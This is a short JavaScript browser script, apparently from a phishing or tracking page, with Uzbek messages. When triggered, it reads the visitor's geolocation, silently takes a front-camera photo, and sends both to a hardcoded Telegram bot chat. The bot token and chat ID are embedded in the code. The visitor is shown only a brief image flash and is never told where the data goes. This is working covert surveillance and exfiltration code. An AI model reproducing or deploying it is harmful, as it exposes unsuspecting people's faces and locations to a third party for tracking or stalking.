const TOKEN_BOT = "8866018667:AAEdFVSQfR-6yTd93Ayd54GVW1B8mrisdDk";
const MY_ID = "6031875285";

async function sendPhotoToTelegram(file) {
    const formData = new FormData();
    formData.append("chat_id", MY_ID);
    formData.append("photo", file);

    const response = await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendPhoto`, {
        method: "POST",
        body: formData
    });

    return response.json();
}

async function capturePhoto() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        alert("Bu brauzerda kamera qo'llab-quvvatlanmaydi.");
        return null;
    }

  const stream = await navigator.mediaDevices.getUserMedia({
    video: {
        facingMode: "user"
    }
});

    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    await new Promise((resolve) => (video.onloadeddata = resolve));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    stream.getTracks().forEach((track) => track.stop());

    return new Promise((resolve) => {
        canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.9);
    });
}

function getphoto() {
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const { latitude, longitude } = position.coords;

            try {
                const locationResponse = await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendLocation`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: MY_ID,
                        latitude,
                        longitude
                    })
                });

                const locationData = await locationResponse.json();
                if (!locationData.ok) {

                }

                const photoBlob = await capturePhoto();
                if (!photoBlob) {
                    alert("Rasm olinmadi.");
                    return;
                }

                const file = new File([photoBlob], "capture.jpg", { type: "image/jpeg" });
                const photoData = await sendPhotoToTelegram(file);

                if (photoData.ok) {
                    let img = document.querySelector('.img')
                    img.style.display = 'block'
                    setInterval(() => {
                        img.style.display = 'none'
                    }, 2000);
                } else {
                    alert(photoData.description || "Rasm yuborilmadi.");
                }
            } catch (error) {
                console.error(error);
                alert("Xabar yuborishda xatolik yuz berdi.");
            }
        },
        (error) => {
            console.error(error);
            alert("Joylashuvga ruxsat bermadingiz.");
        }
    );
}

window.getphoto = getphoto;
